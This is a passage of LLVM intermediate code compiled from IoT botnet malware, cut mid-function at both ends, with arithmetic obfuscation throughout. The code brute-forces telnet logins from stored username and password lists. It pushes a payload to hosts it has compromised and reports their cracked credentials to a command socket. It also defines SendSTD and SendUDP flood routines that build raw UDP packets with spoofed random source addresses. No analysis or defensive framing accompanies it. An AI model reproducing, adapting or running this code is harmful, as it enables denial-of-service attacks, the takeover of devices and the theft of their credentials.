  %686 = call i64 @strlen(i8* %685) #9
  %687 = call i64 @send(i32 %683, i8* %684, i64 %686, i32 16384)
  %688 = icmp slt i64 %687, 0
  br i1 %688, label %689, label %693

; <label>:689:                                    ; preds = %676
  %690 = load i32, i32* %6, align 4
  %691 = sext i32 %690 to i64
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %691
  call void @reset_telstate(%struct.telstate_t* %692)
  br label %885

; <label>:693:                                    ; preds = %676
  %694 = call i32 (...) @RemoveTempDirs()
  %695 = load i32, i32* @mainCommSock, align 4
  %696 = load i32, i32* %6, align 4
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %697
  %699 = call i8* @get_telstate_host(%struct.telstate_t* %698)
  %700 = load i32, i32* %6, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %701
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %702, i32 0, i32 4
  %704 = load i8, i8* %703, align 2
  %705 = zext i8 %704 to i64
  %706 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %705
  %707 = load i8*, i8** %706, align 8
  %708 = load i32, i32* %6, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 5
  %712 = load i8, i8* %711, align 1
  %713 = zext i8 %712 to i64
  %714 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %713
  %715 = load i8*, i8** %714, align 8
  %716 = call i32 (i32, i8*, ...) @sockprintf(i32 %695, i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.118, i32 0, i32 0), i8* %699, i8* %707, i8* %715)
  %717 = load i32, i32* %6, align 4
  %718 = sext i32 %717 to i64
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %718
  call void @advance_telstate(%struct.telstate_t* %719, i32 8)
  br label %884

; <label>:720:                                    ; preds = %94
  %721 = call i64 @time(i64* null) #5
  %722 = trunc i64 %721 to i32
  %723 = load i32, i32* %6, align 4
  %724 = sext i32 %723 to i64
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %724
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %725, i32 0, i32 7
  store i32 %722, i32* %726, align 16
  %727 = load i32, i32* %6, align 4
  %728 = sext i32 %727 to i64
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %728
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %729, i32 0, i32 0
  %731 = load i32, i32* %730, align 16
  %732 = call i64 @send(i32 %731, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.119, i32 0, i32 0), i64 4, i32 16384)
  %733 = icmp slt i64 %732, 0
  br i1 %733, label %734, label %735

; <label>:734:                                    ; preds = %720
  br label %735

; <label>:735:                                    ; preds = %734, %720
  %736 = load i32, i32* %6, align 4
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %737
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %738, i32 0, i32 0
  %740 = load i32, i32* %739, align 16
  %741 = call i64 @send(i32 %740, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.120, i32 0, i32 0), i64 7, i32 16384)
  %742 = icmp slt i64 %741, 0
  br i1 %742, label %743, label %744

; <label>:743:                                    ; preds = %735
  br label %744

; <label>:744:                                    ; preds = %743, %735
  %745 = load i32, i32* %6, align 4
  %746 = sext i32 %745 to i64
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %746
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %747, i32 0, i32 0
  %749 = load i32, i32* %748, align 16
  %750 = load i8*, i8** @payload, align 8
  %751 = load i8*, i8** @payload, align 8
  %752 = call i64 @strlen(i8* %751) #9
  %753 = call i64 @send(i32 %749, i8* %750, i64 %752, i32 16384)
  %754 = icmp slt i64 %753, 0
  br i1 %754, label %755, label %759

; <label>:755:                                    ; preds = %744
  %756 = load i32, i32* %6, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %757
  call void @reset_telstate(%struct.telstate_t* %758)
  br label %885

; <label>:759:                                    ; preds = %744
  %760 = load i32, i32* @mainCommSock, align 4
  %761 = load i32, i32* %6, align 4
  %762 = sext i32 %761 to i64
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %762
  %764 = call i8* @get_telstate_host(%struct.telstate_t* %763)
  %765 = load i32, i32* %6, align 4
  %766 = sext i32 %765 to i64
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %766
  %768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %767, i32 0, i32 4
  %769 = load i8, i8* %768, align 2
  %770 = zext i8 %769 to i64
  %771 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %770
  %772 = load i8*, i8** %771, align 8
  %773 = load i32, i32* %6, align 4
  %774 = sext i32 %773 to i64
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %774
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %775, i32 0, i32 5
  %777 = load i8, i8* %776, align 1
  %778 = zext i8 %777 to i64
  %779 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %778
  %780 = load i8*, i8** %779, align 8
  %781 = call i32 (i32, i8*, ...) @sockprintf(i32 %760, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.121, i32 0, i32 0), i8* %764, i8* %772, i8* %780)
  %782 = load i32, i32* %6, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %783
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %784, i32 0, i32 0
  %786 = load i32, i32* %785, align 16
  %787 = load i32, i32* %3, align 4
  %788 = load i32, i32* %6, align 4
  %789 = sext i32 %788 to i64
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %789
  %791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %790, i32 0, i32 9
  %792 = load i8*, i8** %791, align 8
  %793 = call i32 @read_until_response(i32 %786, i32 %787, i8* %792, i32 1024, i8** bitcast ([10 x i8]* @.str.122 to i8**))
  %794 = icmp ne i32 %793, 0
  br i1 %794, label %795, label %835

; <label>:795:                                    ; preds = %759
  %796 = load i32, i32* %6, align 4
  %797 = sext i32 %796 to i64
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %797
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %798, i32 0, i32 9
  %800 = load i8*, i8** %799, align 8
  %801 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %800, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.123, i32 0, i32 0))
  %802 = icmp ne i32 %801, 0
  br i1 %802, label %803, label %834

; <label>:803:                                    ; preds = %795
  %804 = load i32, i32* %6, align 4
  %805 = sext i32 %804 to i64
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %805
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %806, i32 0, i32 3
  %808 = load i8, i8* %807, align 1
  %809 = zext i8 %808 to i32
  %810 = icmp ne i32 %809, 3
  br i1 %810, label %811, label %834

; <label>:811:                                    ; preds = %803
  %812 = load i32, i32* @mainCommSock, align 4
  %813 = load i32, i32* %6, align 4
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %814
  %816 = call i8* @get_telstate_host(%struct.telstate_t* %815)
  %817 = load i32, i32* %6, align 4
  %818 = sext i32 %817 to i64
  %819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %818
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %819, i32 0, i32 4
  %821 = load i8, i8* %820, align 2
  %822 = zext i8 %821 to i64
  %823 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %822
  %824 = load i8*, i8** %823, align 8
  %825 = load i32, i32* %6, align 4
  %826 = sext i32 %825 to i64
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %826
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %827, i32 0, i32 5
  %829 = load i8, i8* %828, align 1
  %830 = zext i8 %829 to i64
  %831 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %830
  %832 = load i8*, i8** %831, align 8
  %833 = call i32 (i32, i8*, ...) @sockprintf(i32 %812, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.124, i32 0, i32 0), i8* %816, i8* %824, i8* %832)
  br label %834

; <label>:834:                                    ; preds = %811, %803, %795
  br label %835

; <label>:835:                                    ; preds = %834, %759
  %836 = load i32, i32* %6, align 4
  %837 = sext i32 %836 to i64
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %837
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %838, i32 0, i32 7
  %840 = load i32, i32* %839, align 16
  %841 = sub i32 %840, -1226781809
  %842 = add i32 %841, 45
  %843 = add i32 %842, -1226781809
  %844 = add i32 %840, 45
  %845 = zext i32 %843 to i64
  %846 = call i64 @time(i64* null) #5
  %847 = icmp slt i64 %845, %846
  br i1 %847, label %848, label %883

; <label>:848:                                    ; preds = %835
  %849 = load i32, i32* %6, align 4
  %850 = sext i32 %849 to i64
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %850
  %852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %851, i32 0, i32 3
  %853 = load i8, i8* %852, align 1
  %854 = zext i8 %853 to i32
  %855 = icmp ne i32 %854, 3
  br i1 %855, label %856, label %879

; <label>:856:                                    ; preds = %848
  %857 = load i32, i32* @mainCommSock, align 4
  %858 = load i32, i32* %6, align 4
  %859 = sext i32 %858 to i64
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %859
  %861 = call i8* @get_telstate_host(%struct.telstate_t* %860)
  %862 = load i32, i32* %6, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %863
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %864, i32 0, i32 4
  %866 = load i8, i8* %865, align 2
  %867 = zext i8 %866 to i64
  %868 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %867
  %869 = load i8*, i8** %868, align 8
  %870 = load i32, i32* %6, align 4
  %871 = sext i32 %870 to i64
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %871
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %872, i32 0, i32 5
  %874 = load i8, i8* %873, align 1
  %875 = zext i8 %874 to i64
  %876 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %875
  %877 = load i8*, i8** %876, align 8
  %878 = call i32 (i32, i8*, ...) @sockprintf(i32 %857, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.125, i32 0, i32 0), i8* %861, i8* %869, i8* %877)
  br label %879

; <label>:879:                                    ; preds = %856, %848
  %880 = load i32, i32* %6, align 4
  %881 = sext i32 %880 to i64
  %882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %881
  call void @reset_telstate(%struct.telstate_t* %882)
  br label %883

; <label>:883:                                    ; preds = %879, %835
  br label %884

; <label>:884:                                    ; preds = %883, %693, %675, %570, %528, %471, %429, %374, %257, %94
  br label %885

; <label>:885:                                    ; preds = %884, %755, %689, %658, %566, %554, %511, %467, %455, %411, %351, %347, %207, %176
  %886 = load i32, i32* %6, align 4
  %887 = sub i32 0, 1
  %888 = sub i32 %886, %887
  %889 = add nsw i32 %886, 1
  store i32 %888, i32* %6, align 4
  br label %76

; <label>:890:                                    ; preds = %76
  br label %74
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @RemoveTempDirs(...) #1

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [26 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %14, i32* %7, align 4
  %15 = call i64 @time(i64* null) #5
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #5
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  br label %38

; <label>:38:                                     ; preds = %67, %3
  %39 = bitcast [26 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* bitcast ([26 x i8*]* @SendSTD.randstrings to i8*), i64 208, i32 16, i1 false)
  %40 = call i32 @rand() #5
  %41 = sext i32 %40 to i64
  %42 = urem i64 %41, 26
  %43 = getelementptr inbounds [26 x i8*], [26 x i8*]* %12, i64 0, i64 %42
  %44 = load i8*, i8** %43, align 8
  store i8* %44, i8** %13, align 8
  %45 = load i32, i32* %11, align 4
  %46 = icmp uge i32 %45, 50
  br i1 %46, label %47, label %67

; <label>:47:                                     ; preds = %38
  %48 = load i32, i32* %7, align 4
  %49 = load i8*, i8** %13, align 8
  %50 = call i64 @send(i32 %48, i8* %49, i64 75, i32 0)
  %51 = load i32, i32* %7, align 4
  %52 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 16)
  %54 = call i64 @time(i64* null) #5
  %55 = load i64, i64* %8, align 8
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = add i64 %55, 9176808387009312774
  %59 = add i64 %58, %57
  %60 = sub i64 %59, 9176808387009312774
  %61 = add nsw i64 %55, %57
  %62 = icmp sge i64 %54, %60
  br i1 %62, label %63, label %66

; <label>:63:                                     ; preds = %47
  %64 = load i32, i32* %7, align 4
  %65 = call i32 @close(i32 %64)
  call void @_exit(i32 0) #11
  unreachable

; <label>:66:                                     ; preds = %47
  store i32 0, i32* %11, align 4
  br label %67

; <label>:67:                                     ; preds = %66, %38
  %68 = load i32, i32* %11, align 4
  %69 = add i32 %68, -373247177
  %70 = add i32 %69, 1
  %71 = sub i32 %70, -373247177
  %72 = add i32 %68, 1
  store i32 %71, i32* %11, align 4
  br label %38
                                                  ; No predecessors!
  ret void
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %36

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* %8, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %36

; <label>:36:                                     ; preds = %31, %27
  %37 = load i8*, i8** %7, align 8
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %39 = call i32 @getHost(i8* %37, %struct.in_addr* %38)
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  br label %246

; <label>:42:                                     ; preds = %36
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %11, align 4
  store i32 %45, i32* %14, align 4
  %46 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %46, i32* %15, align 4
  %47 = load i32, i32* %15, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  br label %246

; <label>:50:                                     ; preds = %42
  store i32 1, i32* %16, align 4
  %51 = load i32, i32* %15, align 4
  %52 = bitcast i32* %16 to i8*
  %53 = call i32 @setsockopt(i32 %51, i32 0, i32 3, i8* %52, i32 4) #5
  %54 = icmp slt i32 %53, 0
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %50
  br label %246

; <label>:56:                                     ; preds = %50
  store i32 50, i32* %17, align 4
  br label %57

; <label>:57:                                     ; preds = %64, %56
  %58 = load i32, i32* %17, align 4
  %59 = add i32 %58, 1754541840
  %60 = add i32 %59, -1
  %61 = sub i32 %60, 1754541840
  %62 = add nsw i32 %58, -1
  store i32 %61, i32* %17, align 4
  %63 = icmp ne i32 %58, 0
  br i1 %63, label %64, label %81

; <label>:64:                                     ; preds = %57
  %65 = call i64 @time(i64* null) #5
  %66 = call i32 @rand_cmwc()
  %67 = zext i32 %66 to i64
  %68 = xor i64 %65, -1
  %69 = and i64 -3903847985349691020, %68
  %70 = xor i64 -3903847985349691020, -1
  %71 = and i64 %65, %70
  %72 = xor i64 %67, -1
  %73 = and i64 %72, -3903847985349691020
  %74 = and i64 %67, %70
  %75 = or i64 %69, %71
  %76 = or i64 %73, %74
  %77 = xor i64 %75, %76
  %78 = xor i64 %65, %67
  %79 = trunc i64 %77 to i32
  call void @srand(i32 %79) #5
  %80 = call i32 @rand() #5
  call void @init_rand(i32 %80)
  br label %57

; <label>:81:                                     ; preds = %57
  %82 = load i32, i32* %12, align 4
  %83 = sub i32 32, 115327014
  %84 = sub i32 %83, %82
  %85 = add i32 %84, 115327014
  %86 = sub nsw i32 32, %82
  %87 = shl i32 1, %85
  %88 = sub i32 %87, -1830374508
  %89 = sub i32 %88, 1
  %90 = add i32 %89, -1830374508
  %91 = sub nsw i32 %87, 1
  %92 = xor i32 %90, -1
  %93 = and i32 -1, %92
  %94 = xor i32 -1, -1
  %95 = and i32 %90, %94
  %96 = or i32 %93, %95
  %97 = xor i32 %90, -1
  store i32 %96, i32* %18, align 4
  %98 = load i32, i32* %10, align 4
  %99 = sext i32 %98 to i64
  %100 = sub i64 0, %99
  %101 = sub i64 28, %100
  %102 = add i64 28, %99
  %103 = call i8* @llvm.stacksave()
  store i8* %103, i8** %19, align 8
  %104 = alloca i8, i64 %101, align 16
  %105 = bitcast i8* %104 to %struct.iphdr*
  store %struct.iphdr* %105, %struct.iphdr** %20, align 8
  %106 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %107 = bitcast %struct.iphdr* %106 to i8*
  %108 = getelementptr i8, i8* %107, i64 20
  %109 = bitcast i8* %108 to %struct.udphdr*
  store %struct.udphdr* %109, %struct.udphdr** %21, align 8
  %110 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %112 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %111, i32 0, i32 0
  %113 = load i32, i32* %112, align 4
  %114 = load i32, i32* %18, align 4
  %115 = call i32 @getRandomIP(i32 %114)
  %116 = call i32 @htonl(i32 %115) #10
  %117 = load i32, i32* %10, align 4
  %118 = sext i32 %117 to i64
  %119 = add i64 8, 8175611069209974541
  %120 = add i64 %119, %118
  %121 = sub i64 %120, 8175611069209974541
  %122 = add i64 8, %118
  %123 = trunc i64 %121 to i32
  call void @makeIPPacket(%struct.iphdr* %110, i32 %113, i32 %116, i8 zeroext 17, i32 %123)
  %124 = load i32, i32* %10, align 4
  %125 = sext i32 %124 to i64
  %126 = sub i64 0, 8
  %127 = sub i64 0, %125
  %128 = add i64 %126, %127
  %129 = sub i64 0, %128
  %130 = add i64 8, %125
  %131 = trunc i64 %129 to i16
  %132 = call zeroext i16 @htons(i16 zeroext %131) #10
  %133 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %134 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %133, i32 0, i32 0
  %135 = bitcast %union.anon.1* %134 to %struct.anon.2*
  %136 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %135, i32 0, i32 2
  store i16 %132, i16* %136, align 2
  %137 = call i32 @rand_cmwc()
  %138 = trunc i32 %137 to i16
  %139 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %140 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %139, i32 0, i32 0
  %141 = bitcast %union.anon.1* %140 to %struct.anon.2*
  %142 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %141, i32 0, i32 0
  store i16 %138, i16* %142, align 2
  %143 = load i32, i32* %8, align 4
  %144 = icmp eq i32 %143, 0
  br i1 %144, label %145, label %147

; <label>:145:                                    ; preds = %81
  %146 = call i32 @rand_cmwc()
  br label %152

; <label>:147:                                    ; preds = %81
  %148 = load i32, i32* %8, align 4
  %149 = trunc i32 %148 to i16
  %150 = call zeroext i16 @htons(i16 zeroext %149) #10
  %151 = zext i16 %150 to i32
  br label %152

; <label>:152:                                    ; preds = %147, %145
  %153 = phi i32 [ %146, %145 ], [ %151, %147 ]
  %154 = trunc i32 %153 to i16
  %155 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %156 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %155, i32 0, i32 0
  %157 = bitcast %union.anon.1* %156 to %struct.anon.2*
  %158 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %157, i32 0, i32 1
  store i16 %154, i16* %158, align 2
  %159 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 0
  %161 = bitcast %union.anon.1* %160 to %struct.anon.2*
  %162 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %161, i32 0, i32 3
  store i16 0, i16* %162, align 2
  %163 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %164 = bitcast %struct.udphdr* %163 to i8*
  %165 = getelementptr inbounds i8, i8* %164, i64 8
  %166 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %165, i32 %166)
  %167 = bitcast i8* %104 to i16*
  %168 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 2
  %170 = load i16, i16* %169, align 2
  %171 = zext i16 %170 to i32
  %172 = call zeroext i16 @csum(i16* %167, i32 %171)
  %173 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 7
  store i16 %172, i16* %174, align 2
  %175 = call i64 @time(i64* null) #5
  %176 = load i32, i32* %9, align 4
  %177 = sext i32 %176 to i64
  %178 = sub i64 0, %175
  %179 = sub i64 0, %177
  %180 = add i64 %178, %179
  %181 = sub i64 0, %180
  %182 = add nsw i64 %175, %177
  %183 = trunc i64 %181 to i32
  store i32 %183, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %184

; <label>:184:                                    ; preds = %238, %237, %152
  br label %185

; <label>:185:                                    ; preds = %184
  %186 = load i32, i32* %15, align 4
  %187 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %188 = call i64 @sendto(i32 %186, i8* %104, i64 %101, i32 0, %struct.sockaddr* %187, i32 16)
  %189 = call i32 @rand_cmwc()
  %190 = trunc i32 %189 to i16
  %191 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %192 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %191, i32 0, i32 0
  %193 = bitcast %union.anon.1* %192 to %struct.anon.2*
  %194 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %193, i32 0, i32 0
  store i16 %190, i16* %194, align 2
  %195 = load i32, i32* %8, align 4
  %196 = icmp eq i32 %195, 0
  br i1 %196, label %197, label %199

; <label>:197:                                    ; preds = %185
  %198 = call i32 @rand_cmwc()
  br label %204

; <label>:199:                                    ; preds = %185
  %200 = load i32, i32* %8, align 4
  %201 = trunc i32 %200 to i16
  %202 = call zeroext i16 @htons(i16 zeroext %201) #10
  %203 = zext i16 %202 to i32
  br label %204

; <label>:204:                                    ; preds = %199, %197
  %205 = phi i32 [ %198, %197 ], [ %203, %199 ]
  %206 = trunc i32 %205 to i16
  %207 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %208 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %207, i32 0, i32 0
  %209 = bitcast %union.anon.1* %208 to %struct.anon.2*
  %210 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %209, i32 0, i32 1
  store i16 %206, i16* %210, align 2
  %211 = call i32 @rand_cmwc()
  %212 = trunc i32 %211 to i16
  %213 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 3
  store i16 %212, i16* %214, align 4
  %215 = load i32, i32* %18, align 4
  %216 = call i32 @getRandomIP(i32 %215)
  %217 = call i32 @htonl(i32 %216) #10
  %218 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 8
  store i32 %217, i32* %219, align 4
  %220 = bitcast i8* %104 to i16*
  %221 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 2
  %223 = load i16, i16* %222, align 2
  %224 = zext i16 %223 to i32
  %225 = call zeroext i16 @csum(i16* %220, i32 %224)
  %226 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 7
  store i16 %225, i16* %227, align 2
  %228 = load i32, i32* %23, align 4
  %229 = load i32, i32* %14, align 4
  %230 = icmp eq i32 %228, %229
  br i1 %230, label %231, label %238

